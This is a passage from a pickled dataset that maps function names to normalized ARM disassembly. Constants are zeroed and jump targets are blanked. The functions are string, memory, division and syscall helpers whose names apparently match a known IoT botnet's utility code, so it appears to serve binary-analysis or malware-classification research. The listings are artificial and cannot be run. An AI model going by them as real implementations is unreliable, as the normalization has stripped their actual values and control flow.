,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~PC,[SP]"'
p170
L808L
tp171
a(S'util_strlen'
p172
S'"MOV~R2,R0\nLDRB~R0,[R0]\nCMP~R0,0\nMOVEQ~PC,LR\nMOV~R0,0\nADD~R0,R0,0\nLDRB~R3,[R0,R2]\nCMP~R3,0\nBNE~FOO\nRET"'
p173
L40L
tp174
a(S'util_strncmp'
p175
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R7,R0\nMOV~R6,R1\nMOV~R5,R2\nBL~FOO\nMOV~R4,R0\nMOV~R0,R6\nBL~FOO\nCMP~R0,R5\nCMPGE~R4,R5\nBGE~FOO\nB~FOO\nLDRB~R2,[R7]\nLDRB~R3,[R6]\nCMP~R2,R3\nBNE~FOO\nADD~R7,R7,0\nADD~R6,R6,0\nSUB~R5,R5,0\nCMN~R5,0\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4-R7,PC}\nMOV~R0,0\nLDMFD~SP!,{R4-R7,PC}"'
p176
L100L
tp177
a(S'util_strcmp'
p178
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R6,R0\nMOV~R5,R1\nBL~FOO\nMOV~R4,R0\nMOV~R0,R5\nBL~FOO\nCMP~R4,R0\nBNE~FOO\nB~FOO\nLDRB~R2,[R6]\nLDRB~R3,[R5]\nCMP~R2,R3\nBNE~FOO\nADD~R6,R6,0\nADD~R5,R5,0\nSUB~R4,R4,0\nCMN~R4,0\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4-R6,PC}\nMOV~R0,0\nLDMFD~SP!,{R4-R6,PC}"'
p179
L92L
tp180
a(S'util_memcpy'
p181
S'"CMP~R2,0\nMOVEQ~PC,LR\nMOV~R12,0\nLDRB~R3,[R12,R1]\nSTRB~R3,[R12,R0]\nADD~R12,R12,0\nCMP~R12,R2\nBNE~FOO\nRET"'
p182
L36L
tp183
a(S'util_strcpy'
p184
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R4,R0\nMOV~R5,R1\nMOV~R0,R1\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nADD~R2,R6,0\nBL~FOO\nMOV~R0,R6\nLDMFD~SP!,{R4-R6,PC}"'
p185
L48L
tp186
a(S'util_zero'
p187
S'"CMP~R1,0\nMOVEQ~PC,LR\nMOV~R3,0\nMOV~R2,R3\nSTRB~R2,[R3,R0]\nADD~R3,R3,0\nCMP~R3,R1\nBNE~FOO\nRET"'
p188
L36L
tp189
a(S'util_itoa'
p190
S'"STMFD~SP!,{R4-R8,LR}\nSUB~SP,SP,0\nSUBS~R7,R2,0\nBEQ~FOO\nCMP~R0,0\nMOVEQ~R3,0\nSTREQB~R3,[R7]\nSUBEQ~R3,R3,0\nSTREQB~R3,[R7,0]\nBEQ~FOO\nMOV~R3,0\nSTRB~R3,[SP,0]\nMOV~R3,R0,LSR0\nCMP~R1,0\nMOVNE~R3,0\nANDEQ~R3,R3,0\nCMP~R3,0\nMOVEQ~R4,R0\nMOVEQ~R8,0\nBEQ~FOO\nRSB~R4,R0,0\nCMP~R4,0\nMOVNE~R8,0\nBEQ~FOO\nMOV~R5,0\nMOV~R6,R1\nMOV~R0,R4\nMOV~R1,R6\nBL~FOO\nCMP~R0,0\nADDLE~R0,R0,0\nADDGT~R0,R0,0\nADD~R2,SP,0\nADD~R3,R2,R5\nSTRB~R0,[R3,-0]\nMOV~R0,R4\nMOV~R1,R6\nBL~FOO\nSUB~R5,R5,0\nSUBS~R4,R0,0\nBNE~FOO\nCMP~R8,0\nADDEQ~R5,R5,0\nBEQ~FOO\nADD~R3,SP,0\nADD~R2,R3,R5\nMOV~R3,0\nSTRB~R3,[R2,-0]\nMOV~R0,R7\nADD~R1,SP,0\nADD~R1,R1,R5\nBL~FOO\nB~FOO\nMOV~R5,0\nB~FOO\nMOV~R0,R7\nADD~SP,SP,0\nLDMFD~SP!,{R4-R8,PC}"'
p191
L232L
tp192
a(S'util_memsearch'
p193
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R5,R0\nMOV~R4,R2\nMOV~LR,R3\nCMP~R3,R1\nBGT~FOO\nCMP~R1,0\nBLE~FOO\nMOV~R0,0\nMOV~R12,R0\nLDRB~R2,[R0,R5]\nLDRB~R3,[R12,R4]\nCMP~R2,R3\nMOVNE~R12,0\nBNE~FOO\nADD~R12,R12,0\nCMP~LR,R12\nBNE~FOO\nADD~R0,R0,0\nLDMFD~SP!,{R4,R5,PC}\nADD~R0,R0,0\nCMP~R1,R0\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,R5,PC}"'
p194
L100L
tp195
a(S'util_stristr'
p196
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R6,R0\nMOV~R4,R1\nMOV~R5,R2\nMOV~R0,R2\nBL~FOO\nMOV~LR,R0\nMOV~R0,R6\nMOV~R12,0\nB~FOO\nLDRB~R1,[R0]\nLDRB~R2,[R5,R12]\nSUB~R3,R1,0\nCMP~R3,0\nORRLS~R1,R1,0\nSUB~R3,R2,0\nCMP~R3,0\nORRLS~R2,R2,0\nCMP~R1,R2\nMOVNE~R12,0\nBNE~FOO\nADD~R12,R12,0\nCMP~LR,R12\nBNE~FOO\nRSB~R0,R6,R0\nLDMFD~SP!,{R4-R6,PC}\nSUB~R4,R4,0\nCMP~R4,0\nBGT~FOO\nMOV~R0,0\nLDMFD~SP!,{R4-R6,PC}"'
p197
L124L
tp198
a(S'util_atoi'
p199
S'"STMFD~SP!,{R4-R10,LR}\nMOV~R4,R0\nMOV~R8,R1\nLDRB~R2,[R4]\nMOV~R5,R2\nAND~R3,R2,0\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nB~FOO\nLDRB~R5,[R3]\nMOV~R4,R3\nMOV~R7,0\nMOV~R9,0\nB~FOO\nCMP~R2,0\nLDREQB~R5,[R3]\nMOVEQ~R4,R3\nMOV~R7,0\nMOV~R9,0\nMOV~R6,R8\nMOV~R0,R7\nMOV~R1,R8\nBL~FOO\nMOV~R10,R0\nMOV~R0,R7\nMOV~R1,R8\nBL~FOO\nMOV~LR,R0\nMOV~R0,0\nMOV~R12,R0\nAND~R2,R5,0\nSUB~R3,R2,0\nCMP~R3,0\nSUBLS~R2,R5,0\nBLS~FOO\nSUB~R3,R2,0\nSUB~R2,R2,0\nCMP~R3,0\nMOVHI~R1,0\nMOVLS~R1,0\nCMP~R3,0\nCMPHI~R2,0\nBHI~FOO\nCMP~R1,0\nMOVEQ~R3,0\nMOVNE~R3,0\nRSB~R2,R3,R5\nCMP~R2,R8\nBGE~FOO\nCMP~R0,LR\nMOVLS~R3,0\nMOVHI~R3,0\nORRS~R12,R3,R12,LSR0\nBNE~FOO\nCMP~R0,LR\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R2,R10\nMOVLE~R3,0\nCMP~R3,0\nMLAEQ~R0,R6,R0,R2\nMOVEQ~R12,0\nBEQ~FOO\nMOV~R12,0\nLDRB~R5,[R4]\nB~FOO\nCMP~R12,0\nBGE~FOO\nCMP~R9,0\nMOVEQ~R0,0\nMOVNE~R0,0\nLDMFD~SP!,{R4-R10,PC}\nCMP~R9,0\nRSBNE~R0,R0,0\nLDMFD~SP!,{R4-R10,PC}\nMOV~R3,R4\nCMP~R2,0\nBNE~FOO\nB~FOO"'
p200
L328L
tp201
a(S'util_fdgets'
p202
S'"STMFD~SP!,{R4-R8,R10,LR}\nMOV~R10,R0\nMOV~R8,R1\nMOV~R7,R2\nMOV~R4,R0\nMOV~R5,0\nMOV~R6,R4\nMOV~R0,R7\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R5,R5,0\nCMP~R8,R5\nBLE~FOO\nADD~R4,R4,0\nLDRB~R3,[R6]\nCMP~R3,0\nBNE~FOO\nCMP~R5,0\nMOVNE~R0,R10\nMOVEQ~R0,0\nLDMFD~SP!,{R4-R8,R10,PC}"'
p203
L96L
tp204
a(S'util_local_addr'
p205
S'"STMFD~SP!,{R4,R5,LR}\nSUB~SP,SP,0\nMOV~R3,0\nSTR~R3,[SP]\nBL~FOO\nMOV~R4,0\nSTR~R4,[R0]\nMOV~R0,0\nMOV~R1,R0\nMOV~R2,R4\nBL~FOO\nMOV~R5,R0\nCMN~R0,0\nMOVEQ~R0,R4\nBEQ~FOO\nMOV~R2,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R2,[SP,0]\nMOV~R3,0\nORR~R3,R3,R3,LSL0\nSTR~R3,[SP,0]\nSTRB~R2,[SP,0]\nMOV~R3,0\nSTRB~R3,[SP,0]\nADD~R4,SP,0\nMOV~R0,R5\nMOV~R1,R4\nADD~R2,R2,0\nBL~FOO\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,SP\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R0,[SP,0]\nADD~SP,SP,0\nLDMFD~SP!,{R4,R5,PC}"'
p206
L160L
tp207
a(S'__udivsi3'
p208
S'"SUBS~R2,R1,0\nMOVEQ~PC,LR\nBCC~FOO\nCMP~R0,R1\nBLS~FOO\nTST~R1,R2\nBEQ~FOO\nTST~R1,0\nMOVEQ~R1,R1,LSL0\nMOVEQ~R3,0\nMOVNE~R3,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nMOVCC~R3,R3,LSL0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nMOVCC~R3,R3,LSL0\nBCC~FOO\nMOV~R2,0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nORRCS~R2,R2,R3\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,0\nMOVNES~R3,R3,LSR0\nMOVNE~R1,R1,LSR0\nBNE~FOO\nMOV~R0,R2\nRET\nMOVEQ~R0,0\nMOVNE~R0,0\nRET\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nMOVCS~R2,0\nMOVCC~R2,0\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nADDCS~R2,R2,0\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nADDCS~R2,R2,0\nCMP~R1,0\nADDHI~R2,R2,0\nADDLS~R2,R2,R1,LSR0\nMOV~R0,R0,LSRR2\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p209
L248L
tp210
a(S'__aeabi_uidivmod'
p211
S'"STMFD~SP!,{R0,R1,LR}\nBL~FOO\nLDMFD~SP!,{R1,R2,LR}\nMUL~R3,R2,R0\nSUB~R1,R1,R3\nRET"'
p212
L24L
tp213
a(S'__umodsi3'
p214
S'"SUBS~R2,R1,0\nBCC~FOO\nCMPNE~R0,R1\nMOVEQ~R0,0\nTSTHI~R1,R2\nANDEQ~R0,R0,R2\nMOVLS~PC,LR\nMOV~R2,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nSUBS~R2,R2,0\nBLT~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,0\nMOV~R1,R1,LSR0\nSUBGES~R2,R2,0\nBGE~FOO\nTST~R2,0\nTEQNE~R0,0\nBEQ~FOO\nCMN~R2,0\nBLT~FOO\nBEQ~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p215
L204L
tp216
a(S'__modsi3'
p217
S'"CMP~R1,0\nBEQ~FOO\nRSBMI~R1,R1,0\nMOVS~R12,R0\nRSBMI~R0,R0,0\nSUBS~R2,R1,0\nCMPNE~R0,R1\nMOVEQ~R0,0\nTSTHI~R1,R2\nANDEQ~R0,R0,R2\nBLS~FOO\nMOV~R2,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nSUBS~R2,R2,0\nBLT~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,0\nMOV~R1,R1,LSR0\nSUBGES~R2,R2,0\nBGE~FOO\nTST~R2,0\nTEQNE~R0,0\nBEQ~FOO\nCMN~R2,0\nBLT~FOO\nBEQ~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R12,0\nRSBMI~R0,R0,0\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p218
L228L
tp219
a(S'fcntl'
p220
S'"STMFD~SP!,{R1-R3}\nSTMFD~SP!,{R4,LR}\nSUB~SP,SP,0\nLDR~R12,[SP,0]\nSUB~R3,R12,0\nCMP~R3,0\nADD~R3,SP,0\nSTR~R3,[SP]\nLDR~R3,[SP,0]\nMOV~R1,R12\nMOV~R2,R3\nBHI~FOO\nBL~FOO\nB~FOO\nMOV~R2,R3\nMOV~R1,R12\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nADD~SP,SP,0\nLDMFD~SP!,{R4,LR}\nADD~SP,SP,0\nRET"'
p221
L116L
tp222
a(S'fcntl64'
p223
S'"STMFD~SP!,{R1-R3}\nSTMFD~SP!,{R4,LR}\nSUB~SP,SP,0\nADD~R3,SP,0\nSTR~R3,[SP]\nADD~R1,SP,0\nLDMIA~R1,{R1,R2}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nADD~SP,SP,0\nLDMFD~SP!,{R4,LR}\nADD~SP,SP,0\nRET"'
p224
L80L
tp225
a(S'chdir'
p226
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p227
L44L
tp228
a(S'close'
p229
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p230
L44L
tp231
a(S'fork'
p232
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p233
L44L
tp234
a(S'getpid'
p235
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p236
L44L
tp237
a(S'getppid'
p238
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p239
L44L
tp240
a(S'ioctl'
p241
S'"STMFD~SP!,{R1-R3}\nSTMFD~SP!,{R4,LR}\nSUB~SP,SP,0\nADD~R3,SP,0\nSTR~R3,[SP]\nADD~R1,SP,0\nLDMIA~R1,{R1,R2}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nADD~SP,SP,0\nLDMFD~SP!,{R4,LR}\nADD~SP,SP,0\nRET"'
p242
L80L
tp243
a(S'kill'
p244
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p245
L44L
tp246
a(S'open'
p247
S'"STMFD~SP!,{R1-R3}\nSTMFD~SP!,{R4,LR}\nSUB~SP,SP,0\nLDR~R1,[SP,0]\nANDS~R3,R1,0\nADDNE~R3,SP,0\nSTRNE~R3,[SP]\nLDRNE~R3,[SP,0]\nMOV~R2,R3,LSL0\nMOV~R2,R2,LSR0\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nADD~SP,SP,0\nLDMFD~SP!,{R4,LR}\nADD~SP,SP,0\nRET"'
p248
L92L
tp249
a(S'creat'
p250
S'"MOV~R2,R1\nLDR~R1,<STR>\nB~FOO"'
p251
L12L
tp252
a(S'prctl'
p253
S'"STMFD~SP!,{R4,LR}\nLDR~R4,[SP,0]\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p254
L48L
tp255
a(S'read'
p256
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p257
L44L
tp258
a(S'readlink'
p259
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p260
L44L
tp261
a(S'select'
p262
S'"STMFD~SP!,{R4,LR}\nLDR~R4,[SP,0]\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p263
L48L
tp264
a(S'setsid'
p265
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p266
L44L
tp267
a(S'sigprocmask'
p268
S'"CMP~R1,0\nCMPNE~R0,0\nSTMFD~SP!,{R4,LR}\nMOV~R3,0\nBLS~FOO\nBL~FOO\nMOV~R3,0\nMOV~R2,0\nSTR~R3,[R0]\nB~FOO\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R2,R4\nMOV~R0,R2\nLDMFD~SP!,{R4,PC}"'
p269
L84L
tp270
a(S'time'
p271
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p272
L44L
tp273
a(S'unlink'
p274
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p275
L44L
tp276
a(S'write'
p277
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p278
L44L
tp279
a(S'closedir'
p280
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R5,R0\nLDR~R4,[R5]\nSUB~SP,SP,0\nADD~R6,R0,0\nCMN~R4,0\nMOV~R7,SP\nLDR~R1,<STR>\nMOV~R2,R6\nMOV~R0,SP\nBNE~FOO\nBL~FOO\nMOV~R3,0\nMOV~R2,R4\nSTR~R3,[R0]\nB~FOO\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nLDR~R3,<STR>\nMOV~R0,R6\nMOV~LR,PC\nMOV~PC,R3\nMOV~R3,0\nMOV~R1,0\nLDR~R4,[R5]\nMOV~R0,SP\nSTR~R3,[R5]\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nLDR~R0,[R5,0]\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R0,R4\nBL~FOO\nMOV~R2,R0\nMOV~R0,R2\nADD~SP,SP,0\nLDMFD~SP!,{R4-R7,PC}"'
p281
L164L
tp282
a(S'opendir'
p283
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R1,0\nSUB~SP,SP,0\nBL~FOO\nSUBS~R7,R0,0\nMOVLT~R6,0\nBLT~FOO\nMOV~R1,SP\nBL~FOO\nCMP~R0,0\nBLT~FOO\nMOV~R0,R7\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBGE~FOO\nBL~FOO\nMOV~R5,R0\nMOV~R0,R7\nLDR~R4,[R5]\nBL~FOO\nMOV~R6,0\nSTR~R4,[R5]\nB~FOO\nMOV~R0,0\nBL~FOO\nSUBS~R6,R0,0\nBEQ~FOO\nMOV~R4,0\nSTR~R4,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,0\nSTR~R3,[R6,0]\nMOVCC~R3,0\nSTRCC~R3,[R6,0]\nSTR~R7,[R6]\nSTR~R4,[R6,0]\nSTR~R4,[R6,0]\nMOV~R0,0\nLDR~R1,[R6,0]\nBL~FOO\nCMP~R0,0\nSTR~R0,[R6,0]\nBNE~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,R7\nBL~FOO\nBL~FOO\nMOV~R6,0\nMOV~R3,0\nSTR~R3,[R0]\nB~FOO\nMOV~R1,R4\nADD~R0,R6,0\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nMOV~R0,R6\nADD~SP,SP,0\nLDMFD~SP!,{R4-R7,PC}"'
p284
L248L
tp285
a(S'readdir'
p286
S'"STMFD~SP!,{R4,R5,LR}\nADD~R4,R0,0\nSUB~SP,SP,0\nLDR~R3,<STR>\nMOV~R5,R0\nLDR~R1,<STR>\nMOV~R0,SP\nMOV~R2,R4\nMOV~LR,PC\nMOV~PC,R3\nMOV~R0,R4\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nLDMIB~R5,{R2,R3}\nCMP~R3,R2\nBHI~FOO\nLDR~R0,[R5]\nLDR~R1,[R5,0]\nLDR~R2,[R5,0]\nBL~FOO\nCMP~R0,0\nMOVLE~R4,0\nBLE~FOO\nMOV~R3,0\nSTR~R3,[R5,0]\nSTR~R0,[R5,0]\nLDR~R2,[R5,0]\nLDR~R12,[R5,0]\nADD~R4,R2,R12\nLDR~R1,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R0,[R4,0]\nSTR~R1,[R5,0]\nLDR~R1,[R2,R12]\nORR~R3,R3,R0,LSL0\nADD~R2,R2,R3\nCMP~R1,0\nSTR~R2,[R5,0]\nBEQ~FOO\nMOV~R0,SP\nMOV~R1,0\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nMOV~R0,R4\nADD~SP,SP,0\nLDMFD~SP!,{R4,R5,PC}"'
p287
L192L
tp288
a(S'__errno_location'
p289
S'"LDR~R0,<STR>\nRET"'
p290
L8L
tp291
a(S'clock'
p292
S'"STR~LR,[SP,-0]\nSUB~SP,SP,0\nMOV~R0,SP\nBL~FOO\nLDR~R2,[SP,0]\nLDR~R3,[SP]\nADD~R3,R3,R2\nLDR~R2,<STR>\nMUL~R0,R3,R2\nBIC~R0,R0,0\nADD~SP,SP,0\nLDMFD~SP!,{PC}"'
p293
L48L
tp294
a(S'memset'
p295
S'"MOV~R3,R0\nCMP~R2,0\nBLT~FOO\nORR~R1,R1,R1,LSL0\nORR~R1,R1,R1,LSL0\nTST~R3,0\nSTRNEB~R1,[R3]\nSUBNE~R2,R2,0\nBNE~FOO\nMOV~R12,R1\nCMP~R2,0\nBLT~FOO\nSTMIA~R3!,{R1,R12}\nSUB~R2,R2,0\nCMP~R2,0\nBLT~FOO\nSTMIA~R3!,{R1,R12}\nSUB~R2,R2,0\nCMP~R2,0\nBLT~FOO\nSTMIA~R3!,{R1,R12}\nSUB~R2,R2,0\nCMP~R2,0\nSTMGEIA~R3!,{R1,R12}\nSUBGE~R2,R2,0\nBGE~FOO\nMOVS~R2,R2\nMOVEQ~PC,LR\nRSB~R2,R2,0\nADD~PC,PC,R2,LSL0"'
p296
L120L
tp297
a(S'inet_addr'
p298
S'"STR~LR,[SP,-0]\nSUB~SP,SP,0\nMOV~R1,SP\nBL~FOO\nCMP~R0,0\nMOV~R0,0\nLDRNE~R0,[SP]\nADD~SP,SP,0\nLDMFD~SP!,{PC}"'
p299
L36L
tp300
a(S'accept'
p301
